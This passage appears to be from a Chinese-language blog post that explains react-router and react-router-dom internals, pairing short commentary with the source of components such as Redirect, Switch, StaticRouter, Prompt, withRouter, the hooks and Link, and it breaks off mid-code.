: <span class="literal">null</span>&#125;</span><br><span class="line">            &lt;<span class="regexp">/RouterContext.Provider&gt;</span></span><br><span class="line"><span class="regexp">          );</span></span><br><span class="line"><span class="regexp">        &#125;&#125;</span></span><br><span class="line"><span class="regexp">      &lt;/</span>RouterContext.Consumer&gt;</span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> Route;</span><br></pre></td></tr></table></figure>
<h2 id="Redirect"><a href="#Redirect" class="headerlink" title="Redirect"></a>Redirect</h2><p>重定向组件根据传入的push属性可以决定使用history.push还是history.replace进行重定向，根据传入computedMatch, to可以计算出重定向的location。如果在静态组件中，会直接执行重定向。如果不是，采用使用空组件Lifecycle，在组件挂载阶段重定向，在onUpdate中判断重定向是否完成。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> PropTypes <span class="keyword">from</span> <span class="string">"prop-types"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; createLocation, locationsAreEqual &#125; <span class="keyword">from</span> <span class="string">"history"</span>;</span><br><span class="line"><span class="keyword">import</span> invariant <span class="keyword">from</span> <span class="string">"tiny-invariant"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Lifecycle <span class="keyword">from</span> <span class="string">"./Lifecycle.js"</span>;</span><br><span class="line"><span class="keyword">import</span> RouterContext <span class="keyword">from</span> <span class="string">"./RouterContext.js"</span>;</span><br><span class="line"><span class="keyword">import</span> generatePath <span class="keyword">from</span> <span class="string">"./generatePath.js"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The public API for navigating programmatically with a component.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Redirect</span>(<span class="params">&#123; computedMatch, to, push = false &#125;</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;RouterContext.Consumer&gt;</span><br><span class="line">      &#123;context =&gt; &#123;</span><br><span class="line">        invariant(context, <span class="string">"You should not use &lt;Redirect&gt; outside a &lt;Router&gt;"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> &#123; history, staticContext &#125; = context;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> method = push ? history.push : history.replace;</span><br><span class="line">        <span class="keyword">const</span> location = createLocation(</span><br><span class="line">          computedMatch</span><br><span class="line">            ? <span class="keyword">typeof</span> to === <span class="string">"string"</span></span><br><span class="line">              ? generatePath(to, computedMatch.params)</span><br><span class="line">              : &#123;</span><br><span class="line">                  ...to,</span><br><span class="line">                  pathname: generatePath(to.pathname, computedMatch.params)</span><br><span class="line">                &#125;</span><br><span class="line">            : to</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// When rendering in a static context,</span></span><br><span class="line">        <span class="comment">// set the new location immediately.</span></span><br><span class="line">        <span class="keyword">if</span> (staticContext) &#123;</span><br><span class="line">          method(location);</span><br><span class="line">          <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">          &lt;Lifecycle</span><br><span class="line">            onMount=&#123;() =&gt; &#123;</span><br><span class="line">              method(location);</span><br><span class="line">            &#125;&#125;</span><br><span class="line">            onUpdate=&#123;(self, prevProps) =&gt; &#123;</span><br><span class="line">              <span class="keyword">const</span> prevLocation = createLocation(prevProps.to);</span><br><span class="line">              <span class="keyword">if</span> (</span><br><span class="line">                !locationsAreEqual(prevLocation, &#123;</span><br><span class="line">                  ...location,</span><br><span class="line">                  key: prevLocation.key</span><br><span class="line">                &#125;)</span><br><span class="line">              ) &#123;</span><br><span class="line">                method(location);</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;&#125;</span><br><span class="line">            to=&#123;to&#125;</span><br><span class="line">          /&gt;</span><br><span class="line">        );</span><br><span class="line">      &#125;&#125;</span><br><span class="line">    &lt;<span class="regexp">/RouterContext.Consumer&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">export default Redirect;</span></span><br></pre></td></tr></table></figure>
<h2 id="Switch"><a href="#Switch" class="headerlink" title="Switch"></a>Switch</h2><p>被Switch组件包裹的组件只会渲染其中第一个路由匹配成功的组件。</p>
<p>主要通过React.Children.forEach(this.props.children, child =&gt; {})，遍历出第一个匹配的路由及组件，并通过React.cloneElement返回这个组件。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> PropTypes <span class="keyword">from</span> <span class="string">"prop-types"</span>;</span><br><span class="line"><span class="keyword">import</span> invariant <span class="keyword">from</span> <span class="string">"tiny-invariant"</span>;</span><br><span class="line"><span class="keyword">import</span> warning <span class="keyword">from</span> <span class="string">"tiny-warning"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> RouterContext <span class="keyword">from</span> <span class="string">"./RouterContext.js"</span>;</span><br><span class="line"><span class="keyword">import</span> matchPath <span class="keyword">from</span> <span class="string">"./matchPath.js"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The public API for rendering the first &lt;Route&gt; that matches.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Switch</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;RouterContext.Consumer&gt;</span><br><span class="line">        &#123;context =&gt; &#123;</span><br><span class="line">          invariant(context, <span class="string">"You should not use &lt;Switch&gt; outside a &lt;Router&gt;"</span>);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">const</span> location = <span class="keyword">this</span>.props.location || context.location;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">let</span> element, match;</span><br><span class="line"></span><br><span class="line">          <span class="comment">// We use React.Children.forEach instead of React.Children.toArray().find()</span></span><br><span class="line">          <span class="comment">// here because toArray adds keys to all child elements and we do not want</span></span><br><span class="line">          <span class="comment">// to trigger an unmount/remount for two &lt;Route&gt;s that render the same</span></span><br><span class="line">          <span class="comment">// component at different URLs.</span></span><br><span class="line">          React.Children.forEach(<span class="keyword">this</span>.props.children, child =&gt; &#123;</span><br><span class="line">            <span class="keyword">if</span> (match == <span class="literal">null</span> &amp;&amp; React.isValidElement(child)) &#123;</span><br><span class="line">              element = child;</span><br><span class="line"></span><br><span class="line">              <span class="keyword">const</span> path = child.props.path || child.props.from;</span><br><span class="line"></span><br><span class="line">              match = path</span><br><span class="line">                ? matchPath(location.pathname, &#123; ...child.props, path &#125;)</span><br><span class="line">                : context.match;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">return</span> match</span><br><span class="line">            ? React.cloneElement(element, &#123; location, <span class="attr">computedMatch</span>: match &#125;)</span><br><span class="line">            : <span class="literal">null</span>;</span><br><span class="line">        &#125;&#125;</span><br><span class="line">      &lt;<span class="regexp">/RouterContext.Consumer&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">export default Switch;</span></span><br></pre></td></tr></table></figure>
<h2 id="StaticRouter"><a href="#StaticRouter" class="headerlink" title="StaticRouter"></a>StaticRouter</h2><p>静态路由组件自己实现了一个简单的history，没有监听history变化的概念，也不需要go、goBack、goForward、listen、block方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> PropTypes <span class="keyword">from</span> <span class="string">"prop-types"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; createLocation, createPath &#125; <span class="keyword">from</span> <span class="string">"history"</span>;</span><br><span class="line"><span class="keyword">import</span> invariant <span class="keyword">from</span> <span class="string">"tiny-invariant"</span>;</span><br><span class="line"><span class="keyword">import</span> warning <span class="keyword">from</span> <span class="string">"tiny-warning"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Router <span class="keyword">from</span> <span class="string">"./Router.js"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addLeadingSlash</span>(<span class="params">path</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> path.charAt(<span class="number">0</span>) === <span class="string">"/"</span> ? path : <span class="string">"/"</span> + path;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addBasename</span>(<span class="params">basename, location</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!basename) <span class="keyword">return</span> location;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    ...location,</span><br><span class="line">    pathname: addLeadingSlash(basename) + location.pathname</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">stripBasename</span>(<span class="params">basename, location</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!basename) <span class="keyword">return</span> location;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> base = addLeadingSlash(basename);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (location.pathname.indexOf(base) !== <span class="number">0</span>) <span class="keyword">return</span> location;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    ...location,</span><br><span class="line">    pathname: location.pathname.substr(base.length)</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">createURL</span>(<span class="params">location</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">typeof</span> location === <span class="string">"string"</span> ? location : createPath(location);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">staticHandler</span>(<span class="params">methodName</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    invariant(<span class="literal">false</span>, <span class="string">"You cannot %s with &lt;StaticRouter&gt;"</span>, methodName);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">noop</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The public top-level API for a "static" &lt;Router&gt;, so-called because it</span></span><br><span class="line"><span class="comment"> * can't actually change the current location. Instead, it just records</span></span><br><span class="line"><span class="comment"> * location changes in a context object. Useful mainly in testing and</span></span><br><span class="line"><span class="comment"> * server-rendering scenarios.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">StaticRouter</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  navigateTo(location, action) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; basename = <span class="string">""</span>, context = &#123;&#125; &#125; = <span class="keyword">this</span>.props;</span><br><span class="line">    context.action = action;</span><br><span class="line">    context.location = addBasename(basename, createLocation(location));</span><br><span class="line">    context.url = createURL(context.location);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  handlePush = <span class="function"><span class="params">location</span> =&gt;</span> <span class="keyword">this</span>.navigateTo(location, <span class="string">"PUSH"</span>);</span><br><span class="line">  handleReplace = <span class="function"><span class="params">location</span> =&gt;</span> <span class="keyword">this</span>.navigateTo(location, <span class="string">"REPLACE"</span>);</span><br><span class="line">  handleListen = <span class="function"><span class="params">()</span> =&gt;</span> noop;</span><br><span class="line">  handleBlock = <span class="function"><span class="params">()</span> =&gt;</span> noop;</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; basename = <span class="string">""</span>, context = &#123;&#125;, location = <span class="string">"/"</span>, ...rest &#125; = <span class="keyword">this</span>.props;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> history = &#123;</span><br><span class="line">      createHref: <span class="function"><span class="params">path</span> =&gt;</span> addLeadingSlash(basename + createURL(path)),</span><br><span class="line">      action: <span class="string">"POP"</span>,</span><br><span class="line">      location: stripBasename(basename, createLocation(location)),</span><br><span class="line">      push: <span class="keyword">this</span>.handlePush,</span><br><span class="line">      replace: <span class="keyword">this</span>.handleReplace,</span><br><span class="line">      go: staticHandler(<span class="string">"go"</span>),</span><br><span class="line">      goBack: staticHandler(<span class="string">"goBack"</span>),</span><br><span class="line">      goForward: staticHandler(<span class="string">"goForward"</span>),</span><br><span class="line">      listen: <span class="keyword">this</span>.handleListen,</span><br><span class="line">      block: <span class="keyword">this</span>.handleBlock</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">Router</span> &#123;<span class="attr">...rest</span>&#125; <span class="attr">history</span>=<span class="string">&#123;history&#125;</span> <span class="attr">staticContext</span>=<span class="string">&#123;context&#125;</span> /&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> StaticRouter;</span><br></pre></td></tr></table></figure>
<h2 id="MemoryRouter"><a href="#MemoryRouter" class="headerlink" title="MemoryRouter"></a>MemoryRouter</h2><p>MemoryRouter的history指定使用了createMemoryHistory，内部逻辑就是Router的逻辑。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> PropTypes <span class="keyword">from</span> <span class="string">"prop-types"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; createMemoryHistory <span class="keyword">as</span> createHistory &#125; <span class="keyword">from</span> <span class="string">"history"</span>;</span><br><span class="line"><span class="keyword">import</span> warning <span class="keyword">from</span> <span class="string">"tiny-warning"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Router <span class="keyword">from</span> <span class="string">"./Router.js"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The public API for a &lt;Router&gt; that stores location in memory.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MemoryRouter</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  history = createHistory(<span class="keyword">this</span>.props);</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">Router</span> <span class="attr">history</span>=<span class="string">&#123;this.history&#125;</span> <span class="attr">children</span>=<span class="string">&#123;this.props.children&#125;</span> /&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> MemoryRouter;</span><br></pre></td></tr></table></figure>
<h2 id="Prompt"><a href="#Prompt" class="headerlink" title="Prompt"></a>Prompt</h2><p>Prompt组件当Router不是staticRouter且when属性为true时才生效。</p>
<p>调用的是前面介绍的history.block()方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> PropTypes <span class="keyword">from</span> <span class="string">"prop-types"</span>;</span><br><span class="line"><span class="keyword">import</span> invariant <span class="keyword">from</span> <span class="string">"tiny-invariant"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Lifecycle <span class="keyword">from</span> <span class="string">"./Lifecycle.js"</span>;</span><br><span class="line"><span class="keyword">import</span> RouterContext <span class="keyword">from</span> <span class="string">"./RouterContext.js"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The public API for prompting the user before navigating away from a screen.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Prompt</span>(<span class="params">&#123; message, when = true &#125;</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    &lt;RouterContext.Consumer&gt;</span><br><span class="line">      &#123;context =&gt; &#123;</span><br><span class="line">        invariant(context, <span class="string">"You should not use &lt;Prompt&gt; outside a &lt;Router&gt;"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!when || context.staticContext) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">const</span> method = context.history.block;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">          &lt;Lifecycle</span><br><span class="line">            onMount=&#123;self =&gt; &#123;</span><br><span class="line">              self.release = method(message);</span><br><span class="line">            &#125;&#125;</span><br><span class="line">            onUpdate=&#123;(self, prevProps) =&gt; &#123;</span><br><span class="line">              <span class="keyword">if</span> (prevProps.message !== message) &#123;</span><br><span class="line">                self.release();</span><br><span class="line">                self.release = method(message);</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;&#125;</span><br><span class="line">            onUnmount=&#123;self =&gt; &#123;</span><br><span class="line">              self.release();</span><br><span class="line">            &#125;&#125;</span><br><span class="line">            message=&#123;message&#125;</span><br><span class="line">          /&gt;</span><br><span class="line">        );</span><br><span class="line">      &#125;&#125;</span><br><span class="line">    &lt;<span class="regexp">/RouterContext.Consumer&gt;</span></span><br><span class="line"><span class="regexp">  );</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">export default Prompt;</span></span><br></pre></td></tr></table></figure>
<h2 id="withRouter"><a href="#withRouter" class="headerlink" title="withRouter"></a>withRouter</h2><p>由于从RouterContext.Consumer的context中可以很方便取到路由参数，所以withRouter就很容易实现了。只需要使用高阶组件的形式，接收被包裹组件作为参数，将context作为参数传入被包裹组件组件，再返回这个组件即可。</p>
<p>component还暴露了wrappedComponentRef属性，可以转发ref。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> PropTypes <span class="keyword">from</span> <span class="string">"prop-types"</span>;</span><br><span class="line"><span class="keyword">import</span> hoistStatics <span class="keyword">from</span> <span class="string">"hoist-non-react-statics"</span>;</span><br><span class="line"><span class="keyword">import</span> invariant <span class="keyword">from</span> <span class="string">"tiny-invariant"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> RouterContext <span class="keyword">from</span> <span class="string">"./RouterContext.js"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A public higher-order component to access the imperative API</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">withRouter</span>(<span class="params">Component</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> displayName = <span class="string">`withRouter(<span class="subst">$&#123;Component.displayName || Component.name&#125;</span>)`</span>;</span><br><span class="line">  <span class="keyword">const</span> C = <span class="function"><span class="params">props</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; wrappedComponentRef, ...remainingProps &#125; = props;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      &lt;RouterContext.Consumer&gt;</span><br><span class="line">        &#123;context =&gt; &#123;</span><br><span class="line">          invariant(</span><br><span class="line">            context,</span><br><span class="line">            <span class="string">`You should not use &lt;<span class="subst">$&#123;displayName&#125;</span> /&gt; outside a &lt;Router&gt;`</span></span><br><span class="line">          );</span><br><span class="line">          <span class="keyword">return</span> (</span><br><span class="line">            &lt;Component</span><br><span class="line">              &#123;...remainingProps&#125;</span><br><span class="line">              &#123;...context&#125;</span><br><span class="line">              ref=&#123;wrappedComponentRef&#125;</span><br><span class="line">            /&gt;</span><br><span class="line">          );</span><br><span class="line">        &#125;&#125;</span><br><span class="line">      &lt;<span class="regexp">/RouterContext.Consumer&gt;</span></span><br><span class="line"><span class="regexp">    );</span></span><br><span class="line"><span class="regexp">  &#125;;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">  C.displayName = displayName;</span></span><br><span class="line"><span class="regexp">  C.WrappedComponent = Component;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">  return hoistStatics(C, Component);</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">export default withRouter;</span></span><br></pre></td></tr></table></figure>
<h2 id="hooks"><a href="#hooks" class="headerlink" title="hooks"></a>hooks</h2><p>react-router还使用了useContext hook使用react hook的方式来提供一些路由参数和history。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> invariant <span class="keyword">from</span> <span class="string">"tiny-invariant"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> Context <span class="keyword">from</span> <span class="string">"./RouterContext.js"</span>;</span><br><span class="line"><span class="keyword">import</span> HistoryContext <span class="keyword">from</span> <span class="string">"./HistoryContext.js"</span>;</span><br><span class="line"><span class="keyword">import</span> matchPath <span class="keyword">from</span> <span class="string">"./matchPath.js"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> useContext = React.useContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">useHistory</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> useContext(HistoryContext);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">useLocation</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> useContext(Context).location;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">useParams</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> match = useContext(Context).match;</span><br><span class="line">  <span class="keyword">return</span> match ? match.params : &#123;&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">useRouteMatch</span>(<span class="params">path</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> location = useLocation();</span><br><span class="line">  <span class="keyword">const</span> match = useContext(Context).match;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> path ? matchPath(location.pathname, path) : match;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="react-router-dom"><a href="#react-router-dom" class="headerlink" title="react-router-dom"></a>react-router-dom</h1><p>react-router中还包括react-router-dom库的实现，来提供dom相关的路由操作。</p>
<p>我们在react工程中一般使用的就是react-router-dom库，它的底层是前面介绍的react-router。</p>
<h2 id="BrowserRouter"><a href="#BrowserRouter" class="headerlink" title="BrowserRouter"></a>BrowserRouter</h2><p>我们在项目中使用HTML5 history控制路由，可以直接使用react-router-dom中的BrowserRouter。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Router &#125; <span class="keyword">from</span> <span class="string">"react-router"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; createBrowserHistory <span class="keyword">as</span> createHistory &#125; <span class="keyword">from</span> <span class="string">"history"</span>;</span><br><span class="line"><span class="keyword">import</span> PropTypes <span class="keyword">from</span> <span class="string">"prop-types"</span>;</span><br><span class="line"><span class="keyword">import</span> warning <span class="keyword">from</span> <span class="string">"tiny-warning"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The public API for a &lt;Router&gt; that uses HTML5 history.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BrowserRouter</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  history = createHistory(<span class="keyword">this</span>.props);</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">Router</span> <span class="attr">history</span>=<span class="string">&#123;this.history&#125;</span> <span class="attr">children</span>=<span class="string">&#123;this.props.children&#125;</span> /&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> BrowserRouter;</span><br></pre></td></tr></table></figure>
<h2 id="HashRouter"><a href="#HashRouter" class="headerlink" title="HashRouter"></a>HashRouter</h2><p>我们在项目中使用window.location.hash控制路由，可以直接使用react-router-dom中的HashRouter。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; Router &#125; <span class="keyword">from</span> <span class="string">"react-router"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; createHashHistory <span class="keyword">as</span> createHistory &#125; <span class="keyword">from</span> <span class="string">"history"</span>;</span><br><span class="line"><span class="keyword">import</span> PropTypes <span class="keyword">from</span> <span class="string">"prop-types"</span>;</span><br><span class="line"><span class="keyword">import</span> warning <span class="keyword">from</span> <span class="string">"tiny-warning"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The public API for a &lt;Router&gt; that uses window.location.hash.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HashRouter</span> <span class="keyword">extends</span> <span class="title">React</span>.<span class="title">Component</span> </span>&#123;</span><br><span class="line">  history = createHistory(<span class="keyword">this</span>.props);</span><br><span class="line"></span><br><span class="line">  render() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="xml"><span class="tag">&lt;<span class="name">Router</span> <span class="attr">history</span>=<span class="string">&#123;this.history&#125;</span> <span class="attr">children</span>=<span class="string">&#123;this.props.children&#125;</span> /&gt;</span></span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> HashRouter;</span><br></pre></td></tr></table></figure>
<h2 id="Link"><a href="#Link" class="headerlink" title="Link"></a>Link</h2><p><code>&lt;Link&gt;</code>组件是react-router中常见的路由跳转组件。它使用的是html的a标签，为其绑定了点击事件。用户点击时，既可以执行用户自定义的onClick回调函数，也会执行navigate -&gt; method(location)，method可以根据用户传入的replace参数决定是使用history.replace还是history.push，同时点击事件也会阻止事件冒泡以免产生副作用。</p>
<p>Link还暴露了forwardedRef属性，可以转发ref。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> React <span class="keyword">from</span> <span class="string">"react"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123; __RouterContext <span class="keyword">as</span> RouterContext &#125; <span class="keyword">from</span> <span class="string">"react-router"</span>;</span><br><span class="line"><span class="keyword">import</span> PropTypes <span class="keyword">from</span> <span class="string">"prop-types"</span>;</span><br><span class="line"><span class="keyword">import</span> invariant <span class="keyword">from</span> <span class="string">"tiny-invariant"</span>;</span><br><span class="line"><span class="keyword">import</span> &#123;</span><br><span class="line">  resolveToLocation,</span><br><span class="line">  normalizeToLocation</span><br><span class="line">&#125; <span class="keyword">from</span> <span class="string">"./utils/locationUtils.js"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// React 15 compat</span></span><br><span class="line"><span class="keyword">const</span> forwardRefShim = <span class="function"><span class="params">C</span> =&gt;</span> C;</span><br><span class="line"><span class="keyword">let</span> &#123; forwardRef &#125; = React;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">typeof</span> forwardRef === <span class="string">"undefined"</span>) &#123;</span><br><span class="line">  forwardRef = forwardRefShim;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isModifiedEvent</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> !!(event.metaKey || event.altKey || event.ctrlKey || event.shiftKey);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> LinkAnchor = forwardRef(</span><br><span class="line">  (</span><br><span class="line">    &#123;</span><br><span class="line">      innerRef, <span class="comment">// <span class="doctag">TODO:</span> deprecate</span></span><br><span class="line">      navigate,</span><br><span class="line">      onClick,</span><br><span class="line">      